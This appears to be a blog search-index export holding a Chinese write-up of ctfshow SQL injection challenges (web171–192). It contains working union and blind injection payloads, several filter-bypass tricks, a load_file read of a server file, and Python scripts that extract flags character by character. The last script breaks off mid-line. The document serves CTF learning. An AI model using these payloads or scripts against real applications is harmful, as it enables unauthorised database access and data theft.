<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title>ctfshow_sql</title>
      <link href="/2023/05/02/ctfshow-sql/"/>
      <url>/2023/05/02/ctfshow-sql/</url>
      
        <content type="html"><![CDATA[<h3 id="web171"><a href="#web171" class="headerlink" title="web171"></a>web171</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$sql = &quot;select username,password from user where username !=&#x27;flag&#x27; and id = &#x27;&quot;.$_GET[&#x27;id&#x27;].&quot;&#x27; limit 1;&quot;;</span><br></pre></td></tr></table></figure><p>显然字符型注入，且只回显1条</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"> http://ff9bfe2a-5898-4dea-b591-89cd68ab7a67.challenge.ctf.show/select-waf.php1 order by 3</span><br><span class="line">-1&#x27; union select 1,2,3 --+</span><br><span class="line">-1&#x27; union select 1,2,group_concat(table_name) from information_schema.tables where table_schema=database() --+</span><br><span class="line">-1&#x27; union select 1,2,group_concat(column_name) from information_schema.columns where table_name=&#x27;ctfshow_user&#x27; --+</span><br><span class="line">-1&#x27; union select id,username,password from ctfshow_user --+</span><br></pre></td></tr></table></figure><h3 id="web172"><a href="#web172" class="headerlink" title="web172"></a>web172</h3><p>同上不过库名变成了ctfshow_user2</p><h3 id="web173-返回结果过滤flag"><a href="#web173-返回结果过滤flag" class="headerlink" title="web173 返回结果过滤flag"></a>web173 返回结果过滤flag</h3><p>查询语句依旧不变</p><p>但注意这次多了一个waf</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">//检查结果是否有flag</span><br><span class="line">    if(!preg_match(&#x27;/flag/i&#x27;, json_encode($ret)))&#123;</span><br><span class="line">      $ret[&#x27;msg&#x27;]=&#x27;查询成功&#x27;;</span><br><span class="line">    &#125;</span><br><span class="line">      </span><br></pre></td></tr></table></figure><p>所以不管是查询内容还是显示的内容都不能存在flag</p><p>好办将第二列显示flag的编码一下即可</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">其余查询语句依旧</span><br><span class="line">-1&#x27; union select id,to_base64(username),password from ctfshow_user3 --+</span><br></pre></td></tr></table></figure><h3 id="web176-大写绕过union-select"><a href="#web176-大写绕过union-select" class="headerlink" title="web176 大写绕过union select"></a>web176 大写绕过union select</h3><p>题目提示有过滤，但不知道过滤了什么，一步步探测</p><p>发现应该是过滤了union select</p><p>但是由于sql语句本身对语句是不区分大小写的，所以尝试大小写绕过</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">-1&#x27; uniOn seleCt 1,2,password from ctfshow_user --+ </span><br></pre></td></tr></table></figure><h3 id="web177-空格过滤"><a href="#web177-空格过滤" class="headerlink" title="web177 空格过滤"></a>web177 空格过滤</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">//拼接sql语句查找指定ID用户</span><br><span class="line">$sql = &quot;select id,username,password from ctfshow_user where username !=&#x27;flag&#x27; and id = &#x27;&quot;.$_GET[&#x27;id&#x27;].&quot;&#x27; limit 1;&quot;;</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">//对传入的参数进行了过滤</span><br><span class="line">  function waf($str)&#123;</span><br><span class="line">   //代码过于简单，不宜展示</span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure><p>先进行尝试结果order by就先噶了，浅猜测一下是否是过滤空格</p><p>使用/**/发现没问题，即过滤空格，对应的空格绕过有</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">%0a %0b %0c %0d %09 %a0 /**/ 括号等</span><br></pre></td></tr></table></figure><p>构造</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">-1&#x27;/**/union/**/select/**/1,2,password/**/from/**/ctfshow_user/**/%23</span><br><span class="line">请注意末尾的注释符要是有%23，不然没有用，不知道为什么</span><br></pre></td></tr></table></figure><h3 id="web178-过滤空格和"><a href="#web178-过滤空格和" class="headerlink" title="web178 过滤空格和/**/"></a>web178 过滤空格和/**/</h3><p>跟上一题一样，就给个过滤不知道过了什么</p><p>先尝试同样的payload发现不行，再试一下空格有没有被过滤</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">输入1空格，发现无回显----过滤空格</span><br><span class="line">在输入1/**/，也无=-----过滤了/***/</span><br></pre></td></tr></table></figure><p>ok，尝试一下空格的其他替代如%0a</p><p>发现可行，收工</p><h3 id="web179-过滤空格-0a"><a href="#web179-过滤空格-0a" class="headerlink" title="web179 过滤空格 /**/ %0a"></a>web179 过滤空格 /**/ %0a</h3><p>跟上一题一样的思路</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">输入1空格，发现无回显----过滤空格</span><br><span class="line">在输入1/**/，也无=-----过滤了/***/</span><br><span class="line">输入1%0a，也无------过滤%0a</span><br><span class="line">尝试%0c可以，收工</span><br></pre></td></tr></table></figure><h3 id="web180-—-中-过滤"><a href="#web180-—-中-过滤" class="headerlink" title="web180 —+中+过滤"></a>web180 —+中+过滤</h3><p>跟上一题一样测试发现%0c可用，那什么被过滤了嘞，</p><p>先把上一题的payload放上，显然不对，发现不管输什么都不行，那就只能是一个固定的东西，那么我们就把目光集中一下，注释的问题，尝试—+，#，%23均不对，</p><p>那就做一些手脚吧，针对—+，首先要知道—+中的+代表的是空格的意思，那就可以使用%0c去代替+，发现可行，直接构造payload</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">-1&#x27;%0cunion%0cselect%0c1,2,password%0cfrom%0cctfshow_user%0c--%0c</span><br></pre></td></tr></table></figure><h3 id="web181"><a href="#web181" class="headerlink" title="web181"></a>web181</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">//对传入的参数进行了过滤</span><br><span class="line">  function waf($str)&#123;</span><br><span class="line">    return preg_match(&#x27;/ |\*|\x09|\x0a|\x0b|\x0c|\x00|\x0d|\xa0|\x23|\#|file|into|select/i&#x27;, $str);</span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure><p>显然空格代替均无，且select也无，那就不能进行select注入，看看别人怎么做的</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">知识点：or运算，两边分开运算，若前面无效则只执行后面的</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">//拼接sql语句查找指定ID用户</span><br><span class="line">$sql = &quot;select id,username,password from ctfshow_user where username !=&#x27;flag&#x27; and id = &#x27;&quot;.$_GET[&#x27;id&#x27;].&quot;&#x27; limit 1;&quot;;</span><br></pre></td></tr></table></figure><p>那就看后半句</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">username !=&#x27;flag&#x27; and id = &#x27;-1&#x27;or(username=&#x27;flag&#x27;)and&#x27;a&#x27;=&#x27;a &#x27;</span><br></pre></td></tr></table></figure><p>id=’-1‘显然不成立，所以只会执行后面的，即</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">(username=&#x27;flag&#x27;)---(真正的语句)and&#x27;a&#x27;=&#x27;a&#x27;--（注释符不可用，所以用此来闭合后单引号）</span><br></pre></td></tr></table></figure><p>ok，最终payload就是</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">-1&#x27;or(username=&#x27;flag&#x27;)and&#x27;a&#x27;=&#x27;a</span><br></pre></td></tr></table></figure><h3 id="web182"><a href="#web182" class="headerlink" title="web182"></a>web182</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">//对传入的参数进行了过滤</span><br><span class="line">  function waf($str)&#123;</span><br><span class="line">    return preg_match(&#x27;/ |\*|\x09|\x0a|\x0b|\x0c|\x00|\x0d|\xa0|\x23|\#|file|into|select|flag/i&#x27;, $str);</span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure><p>ok，flag也被过滤了，但是根据之前的经验，flag对应的id为26</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">-1&#x27;or(id=26)and&#x27;a&#x27;=&#x27;a</span><br></pre></td></tr></table></figure><h3 id="web183"><a href="#web183" class="headerlink" title="web183"></a>web183</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">，//拼接sql语句查找指定ID用户</span><br><span class="line">  $sql = &quot;select count(pass) from &quot;.$_POST[&#x27;tableName&#x27;].&quot;;&quot;;</span><br><span class="line">//对传入的参数进行了过滤</span><br><span class="line">function waf($str)&#123;</span><br><span class="line">    return preg_match(&#x27;/ |\*|\x09|\x0a|\x0b|\x0c|\x0d|\xa0|\x00|\#|\x23|file|\=|or|\x7c|select|and|flag|into/i&#x27;, $str);</span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure><p>这里是post传参，所以测试一下</p><p>根据之前题目所知存在ctfshow_user表，测试看一下返回结果</p><p><img src="302723fcc690f17157522b3b3269557f.png" alt="截图"></p><p>再看过滤，过滤了空格，=等语句ban了</p><p>那么可以尝试拼接</p><p>tableName=(ctfshow_user)where(pass)like’ctfshow%’<img src="1771836db16f1623e83e2e6fd74f0f4e.png" alt="截图"></p><p><br></p><p>那么就可以写脚本跑一下后续内容，盲注一下</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line">url=<span class="string">&#x27;http://8a3e6ee8-54ee-4936-83ac-e40e147035f9.challenge.ctf.show/select-waf.php&#x27;</span></span><br><span class="line">flagstr=<span class="string">&quot;&#125;&#123;-1234567890zxcasdqwertyfghvbnuiojklmZXCVBNMASDFGHJKLQWERTYUIOP&quot;</span></span><br><span class="line">flag=<span class="string">&#x27;ctfshow&#x27;</span></span><br><span class="line"><span class="keyword">while</span> <span class="number">1</span>:</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> flagstr:</span><br><span class="line">        payload=&#123;<span class="string">&quot;tableName&quot;</span>:<span class="string">&quot;(ctfshow_user)where(pass)like&#x27;&#123;0&#125;%&#x27;&quot;</span>.<span class="built_in">format</span>(flag+j)&#125;</span><br><span class="line">        r=requests.post(url,payload)</span><br><span class="line">        <span class="keyword">if</span> <span class="string">&quot;$user_count = 1;&quot;</span> <span class="keyword">in</span> r.text:</span><br><span class="line">            flag=flag+i</span><br><span class="line">            <span class="built_in">print</span>(flag)</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">    <span class="keyword">if</span> <span class="string">&#x27;&#125;&#x27;</span><span class="keyword">in</span> flag:</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><h3 id="web184"><a href="#web184" class="headerlink" title="web184"></a>web184</h3><p><img src="3b8d278e14ba040456a65a6cba2b5f40.png" alt="截图"></p><p>相比于上一题过滤了where，所以，where判断语句就不行了，不过可以使用右连接、左连接等方式作为判断，其次‘也被过滤，所以like后就不能接字符串了，不过可以变成十六进制</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">tableName=ctfshow_user as a right join ctfshow_user as b on b.pass like 0x63746673686f7725</span><br><span class="line">ctfshow% ---hex--- 0x63746673686f7725</span><br></pre></td></tr></table></figure><p><img src="0d2bebfefaa12df085867c540147d564.png" alt="截图"></p><p>此时返回的是右表加左表匹配到的内容</p><p>当不匹配时</p><p><img src="4b15c77be3d01f4ae945b7f32746c039.png" alt="截图"></p><p>只返回右表，因此根据这个就可以去盲注出答案</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#-- coding:UTF-8 --</span></span><br><span class="line"><span class="comment"># Author:dota_st</span></span><br><span class="line"><span class="comment"># Date:2021/4/8 21:24</span></span><br><span class="line"><span class="comment"># blog: www.wlhhlc.top</span></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> binascii</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">to_hex</span>(<span class="params">s</span>):</span><br><span class="line">    <span class="comment"># 字符串转16进制</span></span><br><span class="line">    str_16 = binascii.b2a_hex(s.encode(<span class="string">&#x27;utf-8&#x27;</span>))</span><br><span class="line">    str_16 = <span class="built_in">bytes</span>.decode(str_16)</span><br><span class="line">    res = str_16.replace(<span class="string">&quot;b&#x27;&quot;</span>,<span class="string">&quot;&quot;</span>).replace(<span class="string">&quot;&#x27;&quot;</span>,<span class="string">&quot;&quot;</span>)</span><br><span class="line">    <span class="keyword">return</span> res</span><br><span class="line"></span><br><span class="line">url = <span class="string">&quot;http://390a39fe-e6e7-4153-952a-f9e3606a2378.challenge.ctf.show/select-waf.php&quot;</span></span><br><span class="line"><span class="built_in">str</span> = <span class="string">&quot;0123456789abcdefghijklmnopqrstuvwxyz&#123;&#125;-&quot;</span></span><br><span class="line">flag = <span class="string">&quot;ctfshow&quot;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>,<span class="number">666</span>):</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">str</span>:</span><br><span class="line">        result = <span class="string">&quot;0x&quot;</span> + to_hex(flag + j + <span class="string">&quot;%&quot;</span>)</span><br><span class="line">        data = &#123;<span class="string">&quot;tableName&quot;</span>:<span class="string">&quot;ctfshow_user as a right join ctfshow_user as b on b.pass like &#123;0&#125;&quot;</span>.<span class="built_in">format</span>(result)&#125;</span><br><span class="line">        res = requests.post(url=url, data=data)</span><br><span class="line">        <span class="keyword">if</span> <span class="string">&quot;$user_count = 43&quot;</span> <span class="keyword">in</span> res.text:</span><br><span class="line">            flag += j</span><br><span class="line">            <span class="built_in">print</span>(flag)</span><br><span class="line">            <span class="keyword">if</span> j==<span class="string">&quot;&#125;&quot;</span>:</span><br><span class="line">                exit()</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><h3 id="web185，186"><a href="#web185，186" class="headerlink" title="web185，186"></a>web185，186</h3><p><img src="2eb2a9304491c92abbc8f9270c75ae9a.png" alt="截图"></p><p>与上一题相比，过滤了数字，所以十六进制不行了</p><p>这里就要说明一下</p><p>数据库中true相当于1，而true+true==2</p><p>那么我们就可以去拼接出我们想要的数字</p><p>以下是生成chr的数字字符串函数</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">createNum</span>(<span class="params">n</span>):</span><br><span class="line">    <span class="built_in">str</span> = <span class="string">&#x27;true&#x27;</span></span><br><span class="line">    <span class="keyword">if</span> n == <span class="number">1</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&#x27;true&#x27;</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(n - <span class="number">1</span>):</span><br><span class="line">            <span class="built_in">str</span> += <span class="string">&quot;+true&quot;</span></span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">str</span></span><br><span class="line"><span class="comment">#把每一个字符转换成ascii码对应的数值</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">change_str</span>(<span class="params">s</span>):</span><br><span class="line">    <span class="built_in">str</span>=<span class="string">&quot;&quot;</span></span><br><span class="line">    <span class="built_in">str</span>+=<span class="string">&quot;chr(&quot;</span>+createNum(<span class="built_in">ord</span>(s[<span class="number">0</span>]))+<span class="string">&quot;)&quot;</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> s[<span class="number">1</span>:]:</span><br><span class="line">        <span class="built_in">str</span>+=<span class="string">&quot;,chr(&quot;</span>+createNum(<span class="built_in">ord</span>(i))+<span class="string">&quot;)&quot;</span></span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">str</span></span><br></pre></td></tr></table></figure><h3 id="web187"><a href="#web187" class="headerlink" title="web187"></a>web187</h3><p><img src="b5f04e86eb712716cfb5bcaf8754dd4e.png" alt="截图"></p><p>变题型了，看返回逻辑是要求username=admin，且在数据库中成功登录</p><p>其password是被md5加密的，且第二个参数是true，返回的是一个16位二进制</p><p>这里有特殊字符==ffifdyop==</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">echo md5(&#x27;ffifdyop&#x27;,true);</span><br><span class="line">&#x27;or&#x27;6�]��!r,��b</span><br></pre></td></tr></table></figure><p>那么密码这里就传进去后就会返回true</p><p>那么最终就是</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">username=admin</span><br><span class="line">password=ffifdyop</span><br></pre></td></tr></table></figure><p><img src="9edd36c466a48888f2914e4bf5ea55d1.png" alt="截图"></p><h3 id="web-188"><a href="#web-188" class="headerlink" title="web 188"></a>web 188</h3><p><img src="539a416d4f2bd8ec45d4a8ad91d91eaa.png" alt="截图"></p><p>重点在sql语句，在过滤中过滤了许多东西，显然不太能拼接sql语句去查询，但是单看已知查询语句</p><p>比较是一个=，显然就是一个弱比较，当字符遇到数字会强制转换成数字，字符就会变成0，因此当我们传入0，就会和所有字母开头的数据进行匹配，从而查询到所有语句</p><p>当如果不是字母开头就匹配不到，那么就要使用   1||1</p><p>当匹配时，显然username=1是不匹配的，那么久就会执行||1，那么返回结果就是1，所以匹配成功</p><p>password，传数字即可</p><h2 id="盲注"><a href="#盲注" class="headerlink" title="盲注"></a>盲注</h2><h3 id="web-189"><a href="#web-189" class="headerlink" title="web 189"></a>web 189</h3><p><img src="265ab64560cb2191b7608e1759254a64.png" alt="截图"></p><p>看起来似乎和上一题区别不大，但是上一题的payload不行，那就说明密码不是字符开头的，就不能进行弱比较了，再看题目说明flag在api/index.php文件中，那么就可以使用load_file去打开文件，得到其中的内容，然后进行盲注比较</p><p>regexp相当于正则匹配</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#-- coding:UTF-8 --</span></span><br><span class="line"><span class="comment"># Author:dota_st</span></span><br><span class="line"><span class="comment"># Date:2021/4/15 22:14</span></span><br><span class="line"><span class="comment"># blog: www.wlhhlc.top</span></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line">url = <span class="string">&quot;http://e232d7fb-b70d-4123-a740-369d7137c5dd.challenge.ctf.show:8080/api/index.php&quot;</span></span><br><span class="line">all_str = <span class="string">&quot;0123456789abcdefghijklmnopqrstuvwxyz-&#123;&#125;&quot;</span></span><br><span class="line">flag = <span class="string">&quot;ctfshow&#123;&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">200</span>):</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> all_str:</span><br><span class="line">        data = &#123;</span><br><span class="line">            <span class="string">&quot;username&quot;</span>:<span class="string">&quot;if(load_file(&#x27;/var/www/html/api/index.php&#x27;)regexp(&#x27;&#123;0&#125;&#x27;),0,1)&quot;</span>.<span class="built_in">format</span>(flag + j),</span><br><span class="line">            <span class="string">&#x27;password&#x27;</span>:<span class="number">0</span></span><br><span class="line">        &#125;</span><br><span class="line">        res = requests.post(url=url, data=data)</span><br><span class="line">        <span class="keyword">if</span> <span class="string">r&quot;\u5bc6\u7801\u9519\u8bef&quot;</span> <span class="keyword">in</span> res.text: <span class="comment">#密码错误，如果是0，如果是1则返回查询失败</span></span><br><span class="line">            flag +=j</span><br><span class="line">            <span class="built_in">print</span>(flag)</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">        <span class="keyword">if</span> j==<span class="string">&#x27;&#125;&#x27;</span>:</span><br><span class="line">            exit()</span><br><span class="line"></span><br></pre></td></tr></table></figure><h3 id="web190-无"><a href="#web190-无" class="headerlink" title="web190 无"></a>web190 无</h3><p><img src="736c9a60b52e8a2f75471d7dd6b9dde9.png" alt="截图"></p><p>只对密码进行要求，显然就是在用户名出注入语句</p><p>但是，观看返回逻辑，没有返回选项</p><p>随便输入admin 0 返回密码错误，输入 0 0，显示用户名不存在，那么大概率就是盲注了</p><p>但注入判断条件该怎么写</p><p>当用户名是</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">admin&#x27; and 1#</span><br></pre></td></tr></table></figure><p>也会返回密码错误</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">admin&#x27; and 0#</span><br></pre></td></tr></table></figure><p>会返回用户名不存在</p><p>那么大概就是if语句判断了，最终脚本如下</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#-- coding:UTF-8 --</span></span><br><span class="line"><span class="comment"># Author:dota_st</span></span><br><span class="line"><span class="comment"># Date:2021/6/1 21:57</span></span><br><span class="line"><span class="comment"># blog: www.wlhhlc.top</span></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line">url = <span class="string">&quot;http://85a1ea9e-0f13-4e36-8891-bb635e166d58.challenge.ctf.show/api/&quot;</span></span><br><span class="line">data = &#123;<span class="string">&#x27;username&#x27;</span>:<span class="string">&#x27;&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;password&#x27;</span>:<span class="number">123456</span>&#125;</span><br><span class="line">flag = <span class="string">&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>,<span class="number">46</span>):</span><br><span class="line">    start = <span class="number">32</span></span><br><span class="line">    end = <span class="number">127</span></span><br><span class="line">    <span class="keyword">while</span> start &lt; end:</span><br><span class="line">        mid = (start + end) &gt;&gt; <span class="number">1</span></span><br><span class="line">        <span class="comment">#payload = &quot;select group_concat(table_name) from information_schema.tables where table_schema=database()&quot;</span></span><br><span class="line">        <span class="comment">#取字段名：payload = &quot;select group_concat(column_name) from information_schema.columns where table_name=&#x27;ctfshow_fl0g&#x27;&quot;</span></span><br><span class="line">        payload = <span class="string">&quot;select f1ag from ctfshow_fl0g&quot;</span></span><br><span class="line">        <span class="comment">#payload=&quot;select database()&quot;</span></span><br><span class="line">        data[<span class="string">&#x27;username&#x27;</span>] = <span class="string">f&quot;admin&#x27; and if(ascii(substr((<span class="subst">&#123;payload&#125;</span>), <span class="subst">&#123;i&#125;</span> , 1)) &gt; <span class="subst">&#123;mid&#125;</span>, 1, 2)=1#&quot;</span></span><br><span class="line">        res = requests.post(url=url, data=data)</span><br><span class="line">        <span class="keyword">if</span> <span class="string">&quot;密码错误&quot;</span> <span class="keyword">in</span> res.json()[<span class="string">&#x27;msg&#x27;</span>]:</span><br><span class="line">            start = mid +<span class="number">1</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            end = mid</span><br><span class="line">    flag = flag + <span class="built_in">chr</span>(start)</span><br><span class="line">    <span class="built_in">print</span>(flag)</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure><h3 id="191-ascii"><a href="#191-ascii" class="headerlink" title="191 ascii"></a>191 ascii</h3><p><img src="59297b9022ba2782c4fcc3af0165eca0.png" alt="截图"></p><p>对用户名增加了过滤，不允许ascii</p><p>那其实很简单，ord也可以将字符转为ascii码</p><h3 id="192-ascii-ord-hex"><a href="#192-ascii-ord-hex" class="headerlink" title="192 ascii ord hex"></a>192 ascii ord hex</h3><p><img src="f62d2303790379becfdb2b1f94646711.png" alt="截图"></p><p>把ord hex都过滤了</p><p>首先取出这几个函数在这里的作用，都是用于判断，从而返回1或者2，在判断，给select语句返回1或0，所以只要存在一个可以匹配字符或者字符的其他形式的函数即可</p><p>那么之前有说过mysql的正则匹配函数regexp</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line">url = <span class="string">&quot;http://566426d5-6b50-4579-9728-16a5e8cef4a6.challenge.ctf.show/api/&quot;</span></span><br><span class="line">data = &#123;<span class="string">&#x27;username&#x27;</span>:<span class="string">&#x27;&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;password&#x27;</span>:<span class="number">123456</span>&#125;</span><br><span class="line">flag = <span class="string">&#x27;&#x27;</span></span><br><span class="line"><span class="built_in">str</span>=<span class="string">&quot;qwertyuiop&#123;&#125;asdfghjklzxcvbnm-0123456789_ &quot;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>,<span class="number">46</span>):</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">str</span>:</span><br><span class="line">        payload = <span class="string">&quot;select group_concat(table_name) from information_schema.tables where table_schema=database()&quot;</span></span><br><span class="line">        <span class="comment">#取字段名：payload = &quot;select group_concat(column_name) from information_schema.columns where table_name=&#x27;ctfshow_fl0g&#x27;&quot;</span></span><br><span class="line">        <span class="comment">#payload = &quot;select f1ag from ctfshow_fl0g&quot;</span></span><br><span class="line">        <span class="comment">#payload=&quot;select database()&quot;</span></span><br><span class="line">        data[<span class="string">&#x27;username&#x27;</span>] = <span 